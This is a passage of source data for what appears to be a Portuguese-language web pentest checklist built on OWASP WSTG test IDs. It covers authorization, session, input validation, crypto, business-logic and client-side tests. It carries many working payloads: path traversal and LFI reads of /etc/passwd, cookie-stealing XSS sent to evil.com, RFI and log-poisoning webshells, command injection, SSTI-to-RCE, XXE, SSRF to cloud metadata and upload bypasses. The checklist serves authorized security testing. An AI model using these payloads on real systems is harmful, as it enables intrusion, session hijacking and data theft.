?file=..%2f..%2f..%2fetc/passwd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
?file=....\\\\....\\\\etc\\\\passwd (Windows)
【PHP Wrappers (LFI)】
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://input (com POST body: <?php system('id'); ?>)
【Null byte (PHP < 5.3)】
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg
【Em TODOS os parâmetros que referenciam arquivos:】
→ download, file, path, page, template, include, doc, img
【dotdotpwn】
dotdotpwn -m http -h alvo.com.br -f /etc/passwd`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, dotdotpwn, ffuf, curl"},
{id:"WSTG-ATHZ-02",title:"Testing for Bypassing Authorization Schema",resumo:"Testar se é possível acessar recursos de outros usuários ou de roles superiores. Inclui IDOR, manipulação de parâmetros e falta de verificação server-side de autorização.",
como:`【Horizontal (user A → user B)】
1. Login como user A → pegar request de "meu perfil"
2. Trocar ID/email do user A pelo user B na request
3. Conseguiu ver dados do user B? → IDOR!
【Vertical (user → admin)】
1. Login como user normal
2. Acessar URLs de admin diretamente
3. Copiar request de admin e re-enviar com cookie de user
【Burp Extension: Autorize】
→ Instalar Autorize no Burp
→ Configurar cookie de low-priv user
→ Navegar como admin → Autorize testa cada request com cookie low-priv
→ Mostra se autorização está sendo enforced
【Manipulação de params】
→ Alterar: role=admin, isAdmin=true, user_id=1`,tipo:"🔧 Tool + Manual",tools:"Burp Suite + Autorize, curl, manual"},
{id:"WSTG-ATHZ-03",title:"Testing for Privilege Escalation",resumo:"Testar escalação vertical (user→admin) e horizontal (userA→userB). Inclui mass assignment, parameter tampering e manipulação de tokens/cookies de role.",
como:`【Vertical】
→ Interceptar request de admin → re-enviar com session de user
→ Alterar JWT: role: user → role: admin
→ Testar mass assignment:
  PUT /api/user/me {"name":"test","role":"admin"}
【Horizontal】
→ GET /api/orders/123 (sua order)
→ GET /api/orders/124 (order de outro user) → funciona?
【Cookie manipulation】
→ Se cookie tem: role=user → alterar para role=admin
→ Se base64: decodificar → alterar → re-encodificar`,tipo:"📝 Manual + Tool",tools:"Burp Suite, jwt.io, curl, Autorize"},
{id:"WSTG-ATHZ-04",title:"Testing for Insecure Direct Object References",resumo:"Testar IDOR em TODOS os endpoints que usam IDs — incrementar/decrementar números, trocar UUIDs, alterar references em downloads, exports e APIs para acessar dados de outros usuários.",
como:`【Identificar IDs em todas as requests】
/api/user/42 → testar /api/user/43
/api/invoice/1001 → testar /api/invoice/1002
/download?id=abc123 → testar com id de outro user
【Tipos de ID para testar】
→ Numérico sequencial: 1, 2, 3 (mais fácil)
→ UUID: tentar com UUID de outro user
→ Base64: decodificar → alterar → re-encodificar
→ Hash: se MD5 de email, gerar hash de outro email
【Onde testar IDOR】
→ Perfil, pedidos, faturas, downloads, exports
→ API endpoints
→ File access (ex: /files/user123/doc.pdf → /files/user456/doc.pdf)
【Automatizar com Burp】
→ Intruder: substituir IDs com range ou wordlist`,tipo:"🔧 Tool + Manual",tools:"Burp Suite + Autorize, curl, scripts customizados"},
]},
{id:"SESS",name:"Session Management Testing",icon:"🍪",color:"#ffa726",tests:[
{id:"WSTG-SESS-01",title:"Testing for Session Management Schema",resumo:"Analisar o formato, entropia e previsibilidade do token de sessão. Tokens fracos (curtos, sequenciais, baixa entropia) permitem session hijacking por predição.",
como:`1. Fazer login e capturar session cookie
2. Analisar formato: hexadecimal? base64? JWT?
3. Tamanho: < 128 bits = fraco
4. Coletar ~100 tokens → analisar padrão
→ Burp → Sequencer → enviar request de login
→ Analisar entropia (deve ser > 100 bits)
5. Verificar se token muda a cada login`,tipo:"🔧 Tool",tools:"Burp Sequencer, Browser DevTools"},
{id:"WSTG-SESS-02",title:"Testing for Cookies Attributes",resumo:"Verificar flags de segurança dos cookies: Secure (HTTPS only), HttpOnly (no JS access), SameSite (CSRF protection), Path e Domain adequados.",
como:`【Checar no browser】
F12 → Application → Cookies → verificar cada flag
【curl】
curl -sI https://alvo.com.br/login -c - | grep -i set-cookie
【Flags esperadas】
✓ Secure → cookie só enviado via HTTPS
✓ HttpOnly → JS não consegue ler (document.cookie)
✓ SameSite=Strict ou Lax → proteção CSRF
✗ Domain muito amplo (.alvo.com.br) → risco
✗ Path=/ → acessível em todo o site`,tipo:"📝 Manual",tools:"Browser DevTools, curl, Burp Suite"},
{id:"WSTG-SESS-03",title:"Testing for Session Fixation",resumo:"Verificar se o session ID muda após login. Se permanecer o mesmo, um atacante pode fixar um session ID e esperar a vítima autenticar com aquele ID.",
como:`1. Acessar site SEM login → capturar session ID
2. Fazer login
3. Capturar session ID APÓS login
4. Comparar: ID mudou? Se NÃO = Session Fixation!
5. Testar fixação via URL: /login?PHPSESSID=meutoken
6. Testar fixação via meta tag / JS injection`,tipo:"📝 Manual",tools:"Burp Suite, Browser DevTools"},
{id:"WSTG-SESS-04",title:"Testing for Exposed Session Variables",resumo:"Verificar se tokens de sessão aparecem em URLs, logs, Referer header ou cache — qualquer exposição pode permitir session hijacking.",
como:`1. Verificar se session ID aparece na URL
2. Clicar em link externo → checar Referer header
   → curl -sI https://alvo.com.br | grep -i referer
3. Verificar se session aparece em error messages
4. Checar se há token em logs acessíveis
5. Verificar se session está em HTML (hidden fields)`,tipo:"📝 Manual",tools:"Burp Suite, Browser DevTools"},
{id:"WSTG-SESS-05",title:"Testing for Cross Site Request Forgery",resumo:"Testar se ações sensíveis (trocar senha, transferir dinheiro, deletar conta) podem ser executadas por um site externo sem o consentimento do usuário autenticado.",
como:`1. Identificar requests state-changing (POST que alteram dados)
2. Verificar se há CSRF token na request
3. Remover CSRF token → request ainda funciona? = vuln!
4. Alterar CSRF token para valor aleatório → funciona?
5. Usar token de outra sessão → funciona?
【PoC HTML】
<html><body>
<form action="https://alvo.com.br/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
</body></html>
→ Abrir PoC enquanto logado no alvo
→ Se email mudar = CSRF confirmado!`,tipo:"📝 Manual",tools:"Burp Suite, HTML PoC, manual"},
{id:"WSTG-SESS-06",title:"Testing for Logout Functionality",resumo:"Verificar se logout realmente invalida a sessão no server-side. Se o token continuar válido após logout, um atacante que capturou o token pode continuar usando.",
como:`1. Login → copiar session cookie
2. Logout
3. Tentar usar o cookie copiado:
   curl -s https://alvo.com.br/dashboard -H "Cookie: session=TOKEN_COPIADO"
   → Se retornar conteúdo autenticado = sessão não invalidada!
4. Testar botão "Voltar" do browser após logout
5. Verificar se cookies são limpos no client
6. Testar logout em múltiplas abas simultâneas`,tipo:"📝 Manual",tools:"Burp Suite, curl, Browser"},
{id:"WSTG-SESS-07",title:"Testing Session Timeout",resumo:"Verificar se sessões expiram após período de inatividade adequado. Sessões sem timeout permitem uso indefinido de tokens capturados.",
como:`1. Login → anotar horário
2. Esperar 15, 30, 60 min sem atividade
3. Tentar acessar página protegida → ainda funciona?
4. Verificar se há absolute timeout (expira independente de uso)
5. Timeout < 30min para apps sensíveis (banking)
6. Verificar se timeout é server-side (não apenas JS redirect)`,tipo:"📝 Manual",tools:"Burp Suite, manual timing"},
{id:"WSTG-SESS-08",title:"Testing for Session Puzzling",resumo:"Verificar se variáveis de sessão podem ser sobrescritas entre fluxos diferentes (ex: variável do reset de senha sobrescreve variável de autenticação).",
como:`1. Identificar variáveis de sessão em diferentes fluxos
2. Iniciar fluxo A (ex: reset password) que seta session var
3. Navegar para fluxo B (ex: admin area) que lê mesma var
4. Verificar se state de um fluxo interfere no outro
5. Testar race conditions entre fluxos`,tipo:"📝 Manual",tools:"Burp Suite, manual testing"},
{id:"WSTG-SESS-09",title:"Testing for Session Hijacking",resumo:"Verificar se é possível roubar/sequestrar uma sessão via XSS (roubo de cookie), sniffing de rede (sem HTTPS), predição de token ou via proxy malicioso.",
como:`1. Se XSS existe: <script>fetch('https://evil.com?c='+document.cookie)</script>
   → Se HttpOnly está ausente, cookie é roubado!
2. Sem HTTPS: Wireshark → filtrar por HTTP → cookies visíveis
3. Token previsível: coletar tokens → analisar padrão
4. Via proxy: se tráfego não é HTTPS, proxy intercepta tudo
【Mitigações esperadas】
✓ HttpOnly em cookies de sessão
✓ Secure flag (HTTPS only)
✓ Alta entropia no token
✓ Session binding (IP ou fingerprint)`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, Wireshark, BeEF, XSS payloads"},
]},
{id:"INPV",name:"Input Validation Testing",icon:"💉",color:"#e53935",tests:[
{id:"WSTG-INPV-01",title:"Testing for Reflected Cross Site Scripting",resumo:"Testar XSS refletido: input do usuário é refletido imediatamente na resposta sem sanitização. Permite execução de JS no browser da vítima via link malicioso.",
como:`【Encontrar reflection points】
1. Em cada parâmetro: inserir string única (ex: xss123test)
2. Verificar se aparece no HTML da resposta
3. Se reflete → testar payloads:
【Payloads】
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(1)
'-alert(1)-'
{{7*7}} (template injection)
【Bypass de filtros】
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<ScRiPt>alert(1)</ScRiPt>
【Ferramentas】
dalfox url "https://alvo.com.br/search?q=FUZZ"
XSStrike -u "https://alvo.com.br/search?q=test"`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, dalfox, XSStrike, manual"},
{id:"WSTG-INPV-02",title:"Testing for Stored Cross Site Scripting",resumo:"Testar XSS armazenado: payload é salvo no servidor (perfil, comentário, nome) e executado toda vez que alguém visualiza. Mais perigoso que reflected — afeta múltiplos usuários.",
como:`【Onde testar (campos que salvam dados)】
→ Nome de perfil, bio, avatar URL
→ Comentários, reviews, mensagens
→ Títulos de posts, nomes de arquivos
→ Campos de endereço, empresa, cargo
【Payloads】
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
"><svg/onload=fetch('https://evil.com?c='+document.cookie)>
【Em filenames de upload】
Nome do arquivo: "><img src=x onerror=alert(1)>.jpg
→ Se nome do arquivo é exibido sem sanitização = stored XSS`,tipo:"📝 Manual + Tool",tools:"Burp Suite, XSStrike, manual"},
{id:"WSTG-INPV-03",title:"Testing for HTTP Verb Tampering",resumo:"Trocar método HTTP (GET→POST, POST→PUT) para tentar bypass de controles que só verificam um método específico.",
como:`Interceptar request no Burp → trocar método:
GET /admin → retorna 403?
POST /admin → retorna 200?
PUT /admin → retorna 200?
curl -X GET https://alvo.com.br/admin
curl -X POST https://alvo.com.br/admin
curl -X PUT https://alvo.com.br/admin
curl -X PATCH https://alvo.com.br/admin`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-INPV-04",title:"Testing for HTTP Parameter Pollution",resumo:"Enviar mesmo parâmetro duplicado para confundir o backend. Diferentes frameworks processam parâmetros duplicados de formas diferentes, podendo bypassar WAF ou filtros.",
como:`?id=1&id=2 → qual valor o backend usa?
→ PHP: usa o último (id=2)
→ ASP.NET: concatena (id=1,2)
→ JSP: usa o primeiro (id=1)
【Bypass de WAF via HPP】
?id=1/*&id=*/UNION+SELECT+1,2,3
→ WAF vê "1/*" (inofensivo) mas backend recebe a injeção`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-INPV-05",title:"Testing for SQL Injection",resumo:"Testar injeção SQL em todos os parâmetros. SQLi permite extrair dados do banco, autenticar sem senha, e em casos graves executar comandos no servidor.",
como:`【Testes manuais básicos】
Em cada parâmetro testar:
' → erro SQL = possível SQLi
" → erro SQL = possível SQLi
' OR '1'='1 → bypass de login
1 OR 1=1 → listar todos os registros
1' AND SLEEP(5)-- → se demorar 5s = blind SQLi confirmado
【SQLMap (automatizado)】
sqlmap -u "https://alvo.com.br/page?id=1" --batch --dbs
sqlmap -u "https://alvo.com.br/page?id=1" --batch --tables -D banco
sqlmap -r request.txt --batch (com arquivo do Burp)
【Em headers】
→ Testar SQLi no Cookie, User-Agent, Referer, X-Forwarded-For
【Em JSON/API】
{"search":"' OR 1=1--"}`,tipo:"🔧 Tool + Manual",tools:"sqlmap, Burp Suite, manual"},
{id:"WSTG-INPV-06",title:"Testing for LDAP Injection",resumo:"Testar injeção LDAP em campos de busca e autenticação que interagem com diretórios LDAP (Active Directory). Pode permitir bypass de auth ou extração de dados do diretório.",
como:`Em campos de busca/login:
*  → retorna todos os registros?
)(cn=*) → bypass de filtro LDAP
admin)(&) → truncamento de query
admin)(|(password=*)) → extração de atributos
→ Verificar mensagens de erro LDAP
→ Testar em campos de autenticação`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
{id:"WSTG-INPV-07",title:"Testing for XML Injection",resumo:"Testar XXE (XML External Entity) em endpoints que processam XML. Permite ler arquivos do servidor, fazer SSRF e em alguns casos conseguir RCE.",
como:`【XXE básico】
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
【XXE Blind (OOB via HTTP)】
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://SEU_SERVER/xxe_callback">]>
→ Se receber request no seu server = XXE confirmado
【Onde testar】
→ Endpoints SOAP
→ Upload de SVG, DOCX, XLSX (são XML por dentro!)
→ APIs que aceitam Content-Type: application/xml
【Dica】
Mudar Content-Type de application/json para application/xml
e enviar payload XML → às vezes o parser aceita!`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, XXEinjector, curl"},
{id:"WSTG-INPV-08",title:"Testing for SSI Injection",resumo:"Testar Server-Side Includes injection em servidores que processam diretivas SSI. Permite executar comandos no servidor via tags SSI em inputs.",
como:`<!--#exec cmd="id"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#echo var="DATE_LOCAL"-->
→ Testar em campos de input
→ Verificar se servidor usa extensões .shtml, .stm, .shtm`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-INPV-09",title:"Testing for XPath Injection",resumo:"Testar injeção XPath em campos que consultam dados XML. Similar a SQLi mas para bases de dados XML/XPath. Pode extrair dados e bypassar autenticação.",
como:`Em campos de login/busca:
' or '1'='1
' or ''='
1' or '1'='1' or '1'='1
→ Verificar error messages XML/XPath`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
{id:"WSTG-INPV-10",title:"Testing for IMAP SMTP Injection",resumo:"Testar injeção em protocolos de email via formulários de contato e forgot password. Pode permitir envio de spam, email spoofing e exfiltração de dados.",
como:`Em campo de email ou formulário de contato:
test@email.com%0aCc:hacker@evil.com
test@email.com%0aBcc:hacker@evil.com
test@email.com\\r\\nSubject:Hacked
→ Se receber email com headers injetados = vulnerável`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-INPV-11",title:"Testing for Code Injection",resumo:"Testar injeção de código (LFI, RFI, eval injection). LFI permite ler arquivos locais; RFI permite incluir código remoto; eval injection permite execução direta de código.",
como:`【LFI】
?page=../../etc/passwd
?page=php://filter/convert.base64-encode/resource=config.php
【RFI】
?page=http://evil.com/shell.php
?page=https://evil.com/shell.txt
【Eval injection (PHP)】
?input=1;phpinfo()
?input=1;system('id')
【Log poisoning + LFI】
1. Enviar payload em User-Agent: <?php system($_GET['cmd']); ?>
2. Incluir log via LFI: ?page=../../var/log/apache2/access.log&cmd=id`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, ffuf, LFISuite, curl"},
{id:"WSTG-INPV-12",title:"Testing for Command Injection",resumo:"Testar injeção de comandos OS em parâmetros que interagem com o sistema. Se a aplicação passa input do usuário para funções como system(), exec(), é possível executar comandos arbitrários.",
como:`【Payloads】
; id
| whoami
|| id
&& id
\`id\`
$(id)
; sleep 10 (blind - verificar delay)
| ping -c 5 SEU_IP (blind - verificar no tcpdump)
【Onde testar】
→ Campos de ping, traceroute, DNS lookup
→ Processamento de arquivos (conversão, resize)
→ Parâmetros que viram nomes de arquivo
【commix (automatizado)】
commix -u "https://alvo.com.br/page?ip=127.0.0.1" --batch`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, commix, curl"},
{id:"WSTG-INPV-13",title:"Testing for Format String Injection",resumo:"Testar injeção de format string (%s, %x, %n) em inputs que são passados para funções de formatação. Pode causar crash, leitura de memória ou até execução de código.",
como:`Testar em inputs:
%s%s%s%s%s
%x%x%x%x%x
%d%d%d%d%d
AAAA%08x.%08x.%08x
→ Se retornar valores hex ou crash = vulnerável`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
{id:"WSTG-INPV-14",title:"Testing for Incubated Vulnerability",resumo:"Testar vulnerabilidades que são injetadas agora mas executam depois (second-order). Ex: XSS em campo de log que executa quando admin visualiza; SQLi que executa em query batch noturna.",
como:`1. Injetar payload em campo que é armazenado
2. Verificar onde esse dado aparece depois (admin panel, relatórios, logs, emails)
3. Testar second-order SQLi:
   → Registrar username: admin'--
   → Fazer login → se query interna usa username sem sanitizar = SQLi
4. Verificar processamento batch/cron`,tipo:"📝 Manual",tools:"Burp Suite, paciência, manual"},
{id:"WSTG-INPV-15",title:"Testing for HTTP Splitting Smuggling",resumo:"Testar HTTP Request Smuggling (CL.TE / TE.CL) e HTTP Response Splitting (CRLF injection). Permite poisoning de cache, bypass de WAF e hijacking de requests de outros usuários.",
como:`【CRLF Injection】
?param=value%0d%0aInjected-Header:true
?param=value%0d%0a%0d%0a<html>injected</html>
【Request Smuggling (CL.TE)】
→ Usar Burp: Repeater → enviar request com Content-Length e Transfer-Encoding conflitantes
→ Ferramenta: smuggler.py -u https://alvo.com.br
【Hop-by-hop header abuse】
→ Connection: close, X-Forwarded-For, Transfer-Encoding
→ Testar remoção de headers de segurança via hop-by-hop`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, smuggler.py, curl"},
{id:"WSTG-INPV-16",title:"Testing for HTTP Incoming Requests",resumo:"Verificar validação de requests: limites de tamanho, headers oversized, requests malformados e rate limiting. Falta de validação pode causar DoS ou bypass de controles.",
como:`curl -s -H "X-Long-Header: $(python3 -c 'print(\"A\"*10000)')" https://alvo.com.br
→ Testar request com body gigante
→ Verificar rate limiting (bombardear com requests)
→ Testar HTTP/2 specific issues (HPACK bomb)`,tipo:"🔧 Tool",tools:"Burp Suite, curl, scripts"},
{id:"WSTG-INPV-17",title:"Testing for Host Header Injection",resumo:"Manipular header Host para: envenenar cache, roubar tokens de reset de senha (password reset poisoning) e causar routing para backend incorreto.",
como:`【Password Reset Poisoning】
POST /forgot HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
email=vitima@email.com
→ Se link no email usa evil.com = HOST HEADER INJECTION!
【Cache Poisoning】
curl -s https://alvo.com.br -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
【Outros headers para testar】
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Host: alvo.com.br
Host: evil.com  (duplicado)`,tipo:"📝 Manual + Tool",tools:"Burp Suite, curl"},
{id:"WSTG-INPV-18",title:"Testing for Server-side Template Injection",resumo:"Testar SSTI injetando expressões de template engine ({{7*7}}, ${7*7}) em inputs. Se renderizar '49', o servidor está executando o template. Pode escalar para RCE completo.",
como:`【Detectar template engine】
{{7*7}} → 49 = Jinja2/Twig/Nunjucks
${7*7} → 49 = FreeMarker/Velocity
<%= 7*7 %> → 49 = ERB/EJS
#{7*7} → 49 = Slim/Pug
【Escalar para RCE (Jinja2 exemplo)】
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
【Ferramentas】
tplmap -u "https://alvo.com.br/page?name=test"
SSTImap -u "https://alvo.com.br/page?name=test"
【Onde testar】
→ Campos que são renderizados em templates (nome, email, preview)`,tipo:"🔧 Tool + Manual",tools:"tplmap, SSTImap, Burp Suite"},
{id:"WSTG-INPV-19",title:"Testing for Server-Side Request Forgery",resumo:"Testar SSRF: fazer o servidor realizar requests para URLs arbitrárias. Permite acessar serviços internos (metadata, admin panels), portas locais e exfiltrar dados internos.",
como:`【Payloads básicos】
?url=http://127.0.0.1
?url=http://localhost:8080/admin
?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
?url=http://[::1] (IPv6 localhost)
【Bypass de filtros】
?url=http://0x7f000001 (127.0.0.1 em hex)
?url=http://2130706433 (127.0.0.1 em decimal)
?url=http://127.0.0.1.nip.io
?url=http://localtest.me
【Blind SSRF (OOB)】
?url=http://SEU_BURP_COLLABORATOR
→ Se receber request = SSRF confirmado
【Onde testar】
→ Funcionalidades de preview de URL
→ Import de dados por URL
→ Webhooks, callbacks
→ Qualquer param que aceite URL`,tipo:"🔧 Tool + Manual",tools:"Burp Suite + Collaborator, SSRFmap, curl"},
]},
{id:"ERRH",name:"Testing for Error Handling",icon:"⚠️",color:"#78909c",tests:[
{id:"WSTG-ERRH-01",title:"Testing for Improper Error Handling",resumo:"Provocar erros 4xx/5xx e analisar as mensagens. Error handling ruim vaza stack traces, paths internos, versões de software, queries SQL e estrutura do backend.",
como:`curl -s "https://alvo.com.br/page?id='"
curl -s "https://alvo.com.br/page?id=999999"
curl -s "https://alvo.com.br/AAAAAAA"
curl -s -X POST https://alvo.com.br/api -H "Content-Type: application/json" -d '{malformed'
→ Analisar: stack traces, paths do server, versões, DB errors`,tipo:"📝 Manual",tools:"curl, Burp Suite"},
{id:"WSTG-ERRH-02",title:"Testing for Stack Traces",resumo:"Verificar se stack traces são expostos em respostas de erro. Stack traces revelam: linguagem, framework, versão, paths internos, queries SQL e variáveis do ambiente.",
como:`Provocar exceptions intencionais:
→ Enviar tipos de dados errados (string onde espera int)
→ Enviar arrays onde espera string (?id[]=1)
→ Enviar JSON/XML malformado
→ Overflow de campos (string de 10000 chars)
→ Null bytes (%00) em parâmetros
Em cada erro: anotar informações vazadas`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
]},
{id:"CRYP",name:"Testing for Weak Cryptography",icon:"🔑",color:"#42a5f5",tests:[
{id:"WSTG-CRYP-01",title:"Testing for Weak Transport Layer Security",resumo:"Verificar configuração TLS: cipher suites, versões suportadas (TLS 1.0/1.1 devem ser desabilitados), certificate chain e vulnerabilidades como BEAST, POODLE, Heartbleed.",
como:`【testssl.sh (mais completo)】
testssl.sh https://alvo.com.br
【SSL Labs (online)】
→ ssllabs.com/ssltest/analyze.html?d=alvo.com.br
【nmap】
nmap --script ssl-enum-ciphers -p443 alvo.com.br
nmap --script ssl-heartbleed -p443 alvo.com.br
【Verificar:】
✗ SSLv3, TLS 1.0, TLS 1.1 = desabilitados
✓ TLS 1.2 + TLS 1.3 = habilitados
✗ Cipher suites fracas (RC4, DES, NULL, EXPORT)
✓ Perfect Forward Secrecy (ECDHE)
✓ Certificado válido com chain completa`,tipo:"🔧 Tool",tools:"testssl.sh, SSLLabs, nmap, curl"},
{id:"WSTG-CRYP-02",title:"Testing for Padding Oracle",resumo:"Testar se tokens/cookies criptografados são vulneráveis a Padding Oracle. Permite descriptografar e forjar dados criptografados sem conhecer a chave.",
como:`1. Identificar tokens criptografados (cookies, params)
2. Alterar 1 byte do token → analisar resposta
3. Respostas diferentes para padding válido vs inválido? = Oracle!
【PadBuster】
padbuster https://alvo.com.br/page TOKEN_CIFRADO 8 -cookies "auth=TOKEN"
→ 8 = block size (testar 8 e 16)`,tipo:"🔧 Tool",tools:"PadBuster, Burp Suite"},
{id:"WSTG-CRYP-03",title:"Testing for Sensitive Information Sent via Unencrypted Channels",resumo:"Verificar se dados sensíveis trafegam em HTTP (sem SSL). Inclui credenciais, tokens, dados pessoais e informações financeiras que devem ser protegidas em trânsito.",
como:`1. Acessar http://alvo.com.br → redireciona para HTTPS?
2. Verificar mixed content (HTTPS page carregando HTTP resources)
3. APIs internas usando HTTP?
4. curl -s http://alvo.com.br/api/endpoint → funciona sem HTTPS?
5. Wireshark/tcpdump → capturar tráfego e buscar dados em plaintext`,tipo:"📝 Manual + Tool",tools:"curl, Wireshark, Browser DevTools"},
{id:"WSTG-CRYP-04",title:"Testing for Weak Encryption",resumo:"Verificar se algoritmos fracos são usados: MD5/SHA1 para senhas, ECB mode, chaves curtas, IVs hardcoded. Criptografia fraca pode ser quebrada com recursos modernos.",
como:`1. Se houver hashes expostos: identificar tipo
   → hashid HASH_VALUE ou haiti HASH_VALUE
   → MD5 (32 hex chars), SHA1 (40 hex chars) = fracos para senhas
2. Verificar se passwords são hasheados ou cifrados
3. Procurar chaves hardcoded no código-fonte
4. Verificar se ECB mode é usado (blocos repetidos no ciphertext)
5. Checar key sizes (< 128 bits para simétrico = fraco)`,tipo:"📝 Manual + Tool",tools:"hashcat, john, hashid, manual analysis"},
]},
{id:"BUSL",name:"Business Logic Testing",icon:"🧠",color:"#9ccc65",tests:[
{id:"WSTG-BUSL-01",title:"Test Business Logic Data Validation",resumo:"Testar se validação de dados de negócio é feita server-side: valores negativos em preços, quantidades impossíveis, limites de campos e tipos de dados inesperados.",
como:`→ Preço: alterar para 0, -1, 0.001 na request
→ Quantidade: 0, -1, 999999, 1.5
→ Cupom de desconto: aplicar 2x, valor acima de 100%
→ Campos numéricos: enviar string
→ Campos de texto: enviar 100000 caracteres
→ Remover validação JS e re-enviar (Burp)`,tipo:"📝 Manual",tools:"Burp Suite"},
{id:"WSTG-BUSL-02",title:"Test Ability to Forge Requests",resumo:"Verificar se requests podem ser forjados/replayados para repetir operações, alterar parâmetros ocultos e executar ações sem a sequência correta de steps.",
como:`1. Capturar request legítimo no Burp
2. Replay: enviar novamente → funciona?
3. Alterar parâmetros hidden (preço, userId, role)
4. Testar race condition: enviar 10x simultaneamente
   → Burp Turbo Intruder: send same request 50x parallel`,tipo:"📝 Manual + Tool",tools:"Burp Suite + Turbo Intruder"},
{id:"WSTG-BUSL-03",title:"Test Integrity Checks",resumo:"Verificar se dados podem ser modificados em trânsito sem detecção. Se não há HMAC/assinatura/checksum, dados como preço e quantidade podem ser tampered.",
como:`1. Interceptar request com Burp
2. Modificar valores (preço, quantidade, desconto)
3. Re-enviar → servidor aceita? = falta de integrity check
4. Se tem HMAC/signature: remover → aceita sem?
5. Se tem checksum: alterar dados sem recalcular → aceita?`,tipo:"📝 Manual",tools:"Burp Suite"},
{id:"WSTG-BUSL-04",title:"Test for Process Timing",resumo:"Testar race conditions e TOCTOU (Time of Check to Time of Use). Requests simultâneos podem abusar de saldos, cupons, votos e qualquer operação que deveria ser atômica.",
como:`【Race condition com Turbo Intruder】
1. Identificar operação limitada (ex: cupom único, transferência)
2. Configurar Turbo Intruder para enviar 50 requests simultâneos
3. Verificar se operação executou múltiplas vezes
【Timing attack】
→ Comparar tempo de resposta para inputs válidos vs inválidos
→ Diferença de timing pode vazar informação`,tipo:"🔧 Tool + Manual",tools:"Burp Turbo Intruder, scripts paralelos"},
{id:"WSTG-BUSL-05",title:"Test Number of Times a Function Can Be Used Limits",resumo:"Verificar se funções limitadas (cupons, votos, tentativas de código) realmente são bloqueadas após o limite. Testar se é possível usar um recurso mais vezes que o permitido.",
como:`1. Aplicar cupom de desconto → aplicar novamente
2. Votar em enquete → votar novamente (outra session?)
3. Código de indicação: usar o mesmo 100x
4. Free trial: registrar com emails diferentes
5. Testar rate limiting real (não apenas frontend)`,tipo:"📝 Manual",tools:"Burp Suite"},
{id:"WSTG-BUSL-06",title:"Testing for the Circumvention of Work Flows",resumo:"Testar se é possível pular etapas do fluxo: ir direto ao step final de checkout sem preencher dados, confirmar pagamento sem pagar, ativar conta sem verificar email.",
como:`1. Mapear todos os steps do fluxo (ex: carrinho→dados→pagamento→confirmação)
2. Acessar step final diretamente via URL
3. Pular step intermediário (ex: pular pagamento)
4. Alterar ordem dos steps
5. Completar fluxo com dados parciais`,tipo:"📝 Manual",tools:"Burp Suite"},
{id:"WSTG-BUSL-07",title:"Test Defenses Against Application Misuse",resumo:"Verificar se existem defesas contra abuso automatizado: rate limiting, CAPTCHA, detecção de anomalias, bloqueio por comportamento suspeito.",
como:`1. Enviar 100 requests rápidos → é bloqueado?
2. Automatizar ação normal (criação de conta em massa)
3. Verificar se há WAF/rate limiting por IP
4. Testar bypass: X-Forwarded-For com IPs diferentes
5. Verificar se há CAPTCHA em ações sensíveis`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, scripts, curl"},
{id:"WSTG-BUSL-08",title:"Test Upload of Unexpected File Types",resumo:"Testar se upload aceita tipos perigosos (.php, .jsp, .aspx, .html). Upload de webshell é um dos vetores mais críticos para RCE.",
como:`1. Upload .php → curl https://alvo.com.br/uploads/shell.php
2. Double extension: shell.php.jpg
3. Null byte: shell.php%00.jpg
4. MIME type bypass: alterar Content-Type para image/jpeg
5. Case sensitivity: shell.pHp, shell.PHP
6. Polyglot: arquivo que é imagem E PHP ao mesmo tempo`,tipo:"📝 Manual + Tool",tools:"Burp Suite, curl"},
{id:"WSTG-BUSL-09",title:"Test Upload of Malicious Files",resumo:"Testar upload de arquivos maliciosos que exploram processamento server-side: SVG com XSS, DOCX/XLSX com XXE, ZIP bomb, arquivos com path traversal no nome.",
como:`1. SVG com XSS: <svg><script>alert(1)</script></svg>
2. DOCX/XLSX com XXE (são ZIPs com XMLs internos)
3. ZIP bomb: arquivo pequeno que expande para GB
4. Nome com traversal: ../../../etc/cron.d/exploit
5. Arquivo com EICAR (testar antivírus)
6. PDF com JavaScript embutido`,tipo:"📝 Manual",tools:"Burp Suite, craft manual de arquivos"},
]},
{id:"CLNT",name:"Client-side Testing",icon:"🌐",color:"#26c6da",tests:[
{id:"WSTG-CLNT-01",title:"Testing for DOM-Based Cross Site Scripting",resumo:"Testar XSS via DOM — o payload nunca vai ao server, é processado direto pelo JavaScript no browser. Fontes: location.hash, document.URL, window.name; Sinks: innerHTML, eval, document.write.",
como:`【Fontes (sources) para testar】
→ URL fragment: https://alvo.com.br/page#<img src=x onerror=alert(1)>
→ URL params processados por JS
→ postMessage de outra janela
→ window.name
【Sinks perigosos】
